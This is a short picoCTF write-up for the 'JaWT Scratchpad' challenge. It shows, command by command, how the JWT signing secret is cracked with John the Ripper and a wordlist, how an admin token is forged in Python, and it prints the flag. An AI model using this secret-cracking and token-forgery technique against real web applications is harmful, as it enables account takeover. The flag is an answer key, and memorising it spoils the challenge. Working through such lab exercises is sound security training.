# JaWT Scratchpad
# Descripción del reto:
Check the admin scratchpad! Additional details will be available after launching your challenge instance. http://fickle-tempest.picoctf.net:50287/
# Solución:
curl -i -s -X POST http://fickle-tempest.picoctf.net:50287/ -d "user=dark" | grep "Set-Cookie"
Set-Cookie: jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGFyayJ9.HeO-2DFAuVJCOdMYsYNTB43_7gPEt5ZMy2XbxkZ_acc; Path=/

echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGFyayJ9.HeO-2DFAuVJCOdMYsYNTB43_7gPEt5ZMy2XbxkZ_acc" > token.txt
john token.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
ilovepico        (?)

TOKEN=$(python3 -c "import hmac, hashlib, base64; msg = b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ'; sig = base64.urlsafe_b64encode(hmac.new(b'ilovepico', msg, hashlib.sha256).digest()).rstrip(b'='); print((msg + b'.' + sig).decode())")

curl -s --cookie "jwt=$TOKEN" http://fickle-tempest.picoctf.net:50287/ | grep "picoCTF"
                                        <textarea style="margin: 0 auto; display: block;">picoCTF{jawt_was_just_what_you_thought_bbb82bd4a57564aefb32d69dafb60583}</textarea>

'picoCTF{jawt_was_just_what_you_thought_bbb82bd4a57564aefb32d69dafb60583}'
# Notas adicionales
# Referencias